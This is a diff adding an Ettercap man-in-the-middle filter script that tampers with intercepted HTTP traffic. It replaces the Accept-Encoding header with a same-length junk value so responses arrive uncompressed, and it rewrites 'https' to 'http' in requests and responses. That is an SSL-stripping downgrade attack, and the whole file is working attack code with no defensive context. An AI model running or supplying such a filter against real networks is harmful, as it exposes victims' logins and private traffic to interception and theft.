@@ -1,0 +1,31 @@
+if (ip.proto == TCP && tcp.dst == 80) {
+   if (search(DATA.data, "Accept-Encoding")) {
+      replace("Accept-Encoding", "Accept-Rubbish!"); 
+	# note: replacement string is same length as original string
+	msg("[HTTP Response Filter] Encoding zapped.\n");
+   }
+}
+
+if (ip.proto == TCP && tcp.dst == 80) {
+  # msg("[HTTP Response Filter] HTTP request seen.\n");
+   if (search(DECODED.data, "https")){
+      replace("https", "http"); 
+      msg("[HTTP Response Filter] *** HTTPS ZAPPED from request\n");
+   }
+   if (search(DATA.data, "https")){
+      replace("https", "http"); 
+      msg("[HTTP Response Filter] *** HTTPS ZAPPED from request\n");
+   }
+}
+
+if (ip.proto == TCP && tcp.src == 80) {
+  # msg("[HTTP Response Filter] HTTP response seen.\n");
+   if (search(DECODED.data, "https")){
+      replace("https", "http"); 
+      msg("[HTTP Response Filter] *** HTTPS ZAPPED from response\n");
+   }
+   if (search(DATA.data, "https")){
+      replace("https", "http"); 
+      msg("[HTTP Response Filter] *** HTTPS ZAPPED from response\n");
+   }
+}
